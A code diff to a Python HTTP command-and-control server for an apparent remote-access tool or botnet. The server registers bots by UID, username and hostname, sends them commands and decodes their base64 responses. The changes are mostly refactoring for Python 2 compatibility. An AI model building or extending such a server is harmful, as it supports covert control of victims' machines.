@@ -5,21 +5,32 @@ __license__ = "GPLv3"
 import json
 import shutil
 from base64 import b64encode, b64decode
-from http.server import HTTPServer, BaseHTTPRequestHandler
 from os import fstat
-from socketserver import ThreadingMixIn
 from textwrap import dedent
 from threading import Thread
 from time import time
-from urllib.parse import unquote_plus
+
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
+
+try:
+    from urllib.parse import unquote_plus
+except ImportError:
+    # Python2 support.
+    from urllib import unquote_plus
 
 from server import modules
-from server.model import Bot, RequestType, PayloadFactory
+from server.model import Model, Bot, RequestType, PayloadFactory
 from server.view.helper import ViewABC
 
 
-def start_server(model, view: ViewABC, port: int):
-    """Starts the HTTP server in a separate thread."""
+def start_server(model, view, port):
+    """Starts the HTTP server in a separate thread.
+
+    :type model: Model
+    :type view: ViewABC
+    :type port: int
+    """
     # A new instance of the RequestHandler is created for every request.
     _RequestHandler._model = model
     _RequestHandler._view = view
@@ -48,8 +59,11 @@ class _RequestHandler(BaseHTTPRequestHandler):
         self.send_header("Content-type", "text/html")
         self.end_headers()
 
-    def _send_command(self, command_raw: str = ""):
-        """Sends the command to the bot."""
+    def _send_command(self, command_raw=""):
+        """Sends the command to the bot.
+
+        :type command_raw: str
+        """
         response = dedent("""\
         <!DOCTYPE html>
         <HTML>
@@ -125,12 +139,6 @@ class _RequestHandler(BaseHTTPRequestHandler):
                 system_version = ""
                 loader_name = data["loader_name"]
 
-                try:
-                    # Add backwards compatibility for now...
-                    system_version = data["version"]
-                except KeyError:
-                    pass
-
                 if not self._model.is_known_bot(bot_uid):
                     # This is the first time this bot connected.
                     bot = Bot(bot_uid, username, hostname, time(), local_path, system_version, loader_name)
@@ -155,7 +163,7 @@ class _RequestHandler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         # Command responses.
-        data = str(self.rfile.read(int(self.headers.get("Content-Length"))), "utf-8")
+        data = bytes(self.rfile.read(int(self.headers.get("Content-Length")))).decode("utf-8")
         data = json.loads(b64decode(unquote_plus(data.replace("username=", "", 1)).encode()).decode())
 
         response = b64decode(data["response"])
@@ -192,7 +200,7 @@ class _RequestHandler(BaseHTTPRequestHandler):
 
         self._send_command()
 
-    def log_message(self, format, *args):
+    def log_message(self, log_format, *args):
         return  # Don't log random stuff we don't care about, thanks.
 
 
